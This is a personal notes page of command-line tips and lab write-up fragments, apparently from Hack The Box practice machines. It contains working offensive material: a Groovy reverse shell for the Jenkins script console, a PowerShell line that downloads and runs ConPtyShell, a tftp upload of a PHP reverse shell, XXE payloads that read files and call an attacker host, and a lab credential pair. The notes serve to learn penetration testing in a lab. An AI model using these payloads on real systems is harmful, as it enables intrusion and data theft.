<link href="../../styles.module.css" rel="stylesheet">
<link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=Cedarville+Cursive&display=swap" rel="stylesheet">
<link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=Cedarville+Cursive&family=Zen+Tokyo+Zoo&display=swap" rel="stylesheet">
<link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=Cedarville+Cursive&family=Encode+Sans+SC&family=Zen+Tokyo+Zoo&display=swap" rel="stylesheet">


## <span class="copyright">Useful Shit<span style="float:right;">By Shatha Barqawi</span>

<br/><br/>

_________________________


<span class="date">Last Updated: 26/Aug/2021</span> 






<br/>

* `[COMMAND] | tee [FILE NAME]` 
* Stores output of the command in a file.  

<br/>

* `dpkg -l`  
* Shows the packages and libraries on system.
* I think this command is only for Debian based OSes 🤔.


<br/>

* Some info on gcc  
* The option `-Wall` is a warning option.  





### <span class="useful_shit subtitle">Upgrading The Reverse Shell   

* The bitch machine Cronos keeps making problems for me and I can't seem to open the admin some times. So I wasn't able to test the ways I'll be mentioning next (I got them from this <a href="https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/">website</a>)  










* What does versions of software mean?   

    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/8/82/Semver.jpg/440px-Semver.jpg">  


* Groovy Script   
Groovy is a scripting language with Java-like syntax for the Java platform




* Exploiting the ability to execute arbitrary groovy script in script console in jenkins admin page:

```groovy
String host="10.10.15.82";
int port=1234;
String cmd="bash";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```

* What is SMB?  
<blockquote>
The Server Message Block protocol (SMB protocol) is a client-server communication protocol used for sharing access to files, printers, serial ports and other resources on a network. It can also carry transaction protocols for interprocess communication. Over the years, SMB has been used primarily to connect Windows computers, although most other systems -- such as Linux and macOS -- also include client components for connecting to SMB resources.
</blockquote>

* How to use smbclient to view available shares:  
```
smbclient -L \\\\10.129.158.38 -U 'administrator'
```

* To access a share just remove the `-L` and specify the name of the share:  
```
smbclient \\\\10.129.158.38\\ADMIN$ -U 'administrator'
```

* The `$` means that this share is an administrative share.  

* We can use the command `get` inside the smb prompt to download files on our own box.




dir /a:h /b /s

IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 10.10.15.189 3001


* Oopsie  

* Why I got stuck? 
  * I didn't think of changing the id in the url I kept trying to guess the Access ID when in reality I could access it by decreasing the id in the url when I'm viewing the access ID of the guest user. 



* `find directory-location -group {group-name} -name {file-name}` this syntax is used to find the files that belong to the group specified.



* Add new path to the `$PATH` variable 
 `export PATH=/some/new/path:$PATH`






* Nmap results

```
PORT      STATE SERVICE
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
3389/tcp  open  ms-wbt-server
5985/tcp  open  wsman
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49668/tcp open  unknown
49669/tcp open  unknown
49670/tcp open  unknown
49671/tcp open  unknown
```

* Banner Grab  

```
PORT     STATE SERVICE       VERSION
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
3389/tcp open  ms-wbt-server Microsoft Terminal Services
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

```

* So the problem was with the certificate. When I use `xfreerdp /v:[IP ADDRESS] /cert:ignore /u:Administrator`. 
* First off, we use Administrator instead of root in Windows machines.
* Second, I should've looked more into the flags or switches or whatever they call them. Anyway, it wouldn't have occured to me that I have to ignore the cert or that this was an option or that if I put it it will be functional.

```
[03:25:50:543] [2009:2010] [INFO][com.freerdp.client.common.cmdline] - loading channelEx rdpsnd
[03:25:50:543] [2009:2010] [INFO][com.freerdp.client.common.cmdline] - loading channelEx cliprdr
[03:25:50:883] [2009:2010] [INFO][com.freerdp.primitives] - primitives autodetect, using optimized
[03:25:50:918] [2009:2010] [INFO][com.freerdp.core] - freerdp_tcp_is_hostname_resolvable:freerdp_set_last_error_ex resetting error state
[03:25:50:918] [2009:2010] [INFO][com.freerdp.core] - freerdp_tcp_connect:freerdp_set_last_error_ex resetting error state
[03:25:50:214] [2009:2010] [WARN][com.freerdp.crypto] - Certificate verification failure 'self signed certificate (18)' at stack position 0
[03:25:50:214] [2009:2010] [WARN][com.freerdp.crypto] - CN = Explosion

```



* The local file inclusion vul in the http service allowed me to access the `.htpasswd` file which, it seems, contains usernames and password. Indeed, it did contain the username and password of a user named Mike. I'll try and ssh with them. Damn just remembered there's no ssh on the host.
mike:Sheffield19


tftp 10.129.132.172 -m binary -c put revShell.php revShell.php

* It seems like I will be making a container so that I can open it with root privilege.  

[[Linux]]
	
	<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://10.10.15.189/test2.php"> ]>
	
	<!DOCTYPE foo [  

<!ELEMENT foo (#ANY)>

<!ENTITY xxe SYSTEM "https://10.10.15.189/test.php">]><foo>&xxe;</foo>
	
	
	
	<!DOCTYPE root [<!ENTITY steal SYSTEM "php://filter/convert.base64-encode/resource=//10.10.15.189/WhatEver">]>
	
<root><name>test</name><tel>021212</tel><email>&steal;</email><password>pwd</password></root>‌
	
	

	* How to use rsa id to ssh  
	
	ssh -i id_rsa daniel@10.129.140.196
```
python3.5 -c 'import sys; print( "\n".join(sys.path))'
```





